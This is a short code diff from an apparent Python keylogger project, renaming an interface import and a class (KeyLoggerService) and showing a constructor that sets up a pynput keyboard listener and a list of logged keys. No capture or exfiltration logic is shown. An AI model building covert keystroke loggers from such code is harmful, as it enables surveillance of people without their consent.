@@ -1,8 +1,8 @@
 from pynput import keyboard
-from interfaces.IkeyLogger import IKeyLogger
+from interfaces.IkeyLogger import Ikeylogger
 
 # פונקציה להתחחלת הפעולה עם התוכנית סוף הפעולה וקבלת המידע
-class KeyLoggerService(IKeyLogger):
+class Keyloggerservice(Ikeylogger):
     def __init__(self):
         self.logged_keys = []
         self.listener = None
